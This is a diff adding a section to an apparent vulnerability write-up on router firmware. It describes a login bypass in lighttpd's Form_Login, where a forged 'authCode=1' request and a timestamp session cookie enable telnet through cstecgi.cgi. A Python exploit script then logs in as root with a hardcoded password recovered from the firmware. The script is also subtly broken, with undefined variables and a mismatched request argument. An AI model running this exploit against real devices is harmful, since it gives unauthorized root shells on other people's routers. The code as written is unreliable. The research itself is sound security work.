@@ -65,3 +65,74 @@ So we need to reverse the `cs` binary. We can see they echo `KL@UHeZ0` to `/var/
 So the correct credential is `root - KL@UHeZ0`.
 
 ![](pics/login_success.png)
+
+## But...
+
+The problem is I can get a shell only through UART. What if I don't have access to the physical device ? In the web root folder, I see a quite interesting file named `telnet.html`.
+
+![](pics/web_root.png)
+
+This page is use for enable telnet service. If telnet is enabled, we can get a remote shell from the device, sounds great !!<br>
+But the problem is we need admin account to enable telnet. We can see the function use for authen in `cstecgi.cgi` binary. First it get the `username` and `password` from request, then compare it with value save on the device.
+
+![](pics/authen.png)
+
+If all good, the binary create a string to help browser redirect, noted that the `authCode` will be `1` if we use correct username/password.
+
+![](pics/redirect.png)
+
+Seem clear, then we continue to look at `lighttpd` - a lightweight web server usually used on embedded systems. Let's see how it process the login phase. Here is the pic about the function named `Form_Login`.
+
+![](pics/form_login.png)
+
+TBH, I dont know WTF is going on there, but I can guess it will try to parse the redirect request. It get out the `authCode`, `username`, `password`, `goURL` and `flag`. It only check the `authCode` with `1` or `0`. If `0` -> show the login page, if `1` -> go to the page `goURL`.
+
+![](pics/check_authCode.png)
+
+We can manipulate the `authCode` to bypass the login page, then with the same session (they use `timestamps` for this), we can turn on telnet. Lets do it:
+
+```python
+from pwn import *
+import requests, time, sys, os
+
+if len(sys.argv) != 2:
+    print("[+] Need device IP !!")
+    exit(0)
+
+http_sv = "http://%s/" % sys.argv[1]
+url = "formLoginAuth.htm?authCode=1&userName=admin"
+cookie = {"SESSION_ID" : "2:%d:2" % round(time.time())}
+
+bypass_admin_url = http_sv + url
+bypass_admin = requests.get(bypass_admin_url, cookies=cookie)
+
+cgi_url = "cgi-bin/cstecgi.cgi"
+payload = """
+    {"telnet_enabled":"1","topicurl":"setTelnetCfg"}
+"""
+
+enable_telnet_url = http_sv + url_cgi
+enable_telnet = requests.post(enable_telnet, data=payload, cookies=cookie)
+
+if res.status_code == 200:
+    print("[+] Telnet enabled !!\n[+] Get shell...")
+
+    sleep(1)
+
+    with remote(sys.argv[1], 23) as r:
+        r.recvuntil(b"login:")
+        r.sendline(b"root")
+
+        r.recvuntil(b"Password:")
+        r.sendline(b"KL@UHeZ0")
+        r.sendline(b"ls")
+
+        # just for test, r.interactive not working on my :(
+        result = r.recvall(timeout=3).splitlines() 
+        for i in result:
+            print(i.decode())
+
+        r.interactive()
+
+```
+
